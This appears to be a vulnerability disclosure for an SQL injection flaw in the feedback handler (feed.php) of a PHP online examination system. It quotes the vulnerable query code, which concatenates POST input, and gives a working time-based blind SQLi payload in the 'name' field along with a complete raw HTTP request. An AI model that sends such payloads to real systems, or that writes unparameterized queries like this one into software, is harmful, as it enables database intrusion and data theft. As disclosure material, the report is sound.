# SQL Injection Vulnerability in `feed.php` of the Online Examination System

The feedback submission function of the Online Examination System is handled by `feed.php`. The front-end feedback form in `index.php:648` submits a `POST` request to `feed.php?q=index.php`. In the backend code, `feed.php:4`, `feed.php:5`, `feed.php:6`, and `feed.php:11` directly read the `name`, `email`, `subject`, and `feedback` parameters from user input, and `feed.php:12` concatenates them into an `INSERT` statement:

```php
$name = $_POST['name'];
$email = $_POST['email'];
$subject = $_POST['subject'];
$feedback = $_POST['feedback'];
$q=mysqli_query($con,"INSERT INTO feedback VALUES  ('$id' , '$name', '$email' , '$subject', '$feedback' , '$date' , '$time')")or die ("Error");
```

Because the application does not use parameterized queries or effective input sanitization, an attacker can inject malicious SQL through the `name` parameter, resulting in an SQL injection vulnerability. Based on the provided request packet, this issue can be reproduced through a time-based blind SQL injection payload.

## Impact of the SQL Injection Vulnerability

An attacker can use this vulnerability to probe the backend database through the public feedback submission interface and confirm SQL injection. Once confirmed, the attacker may further attempt data extraction, table and column enumeration, or manipulate application data. In practice, this can affect the confidentiality and integrity of feedback records and potentially other database content depending on database permissions.

## Payload

Injection parameter: `name`

Injected value:

```text
11'and(select*from(select+sleep(5))a/**/union/**/select+1)='
```

Request method: `POST`

Request path: `/feed.php?q=index.php`

Raw request:

```http
POST /feed.php?q=index.php HTTP/1.1
Host: project1
Content-Length: 117
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0
Origin: http://project1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://project1/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=2347fp9qoucglmem34csap1fbp
Connection: keep-alive

name=11'and(select*from(select+sleep(5))a/**/union/**/select+1)='&email=11%40qq.com&subject=11&feedback=11&submit=
```

If the application response is delayed by about 5 seconds after sending the request, it indicates that the `name` parameter is likely vulnerable to time-based blind SQL injection.

## Sources Download

## 

```
- [Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)
```

[Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)



![image-20260604114048291](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260604114048291.png)
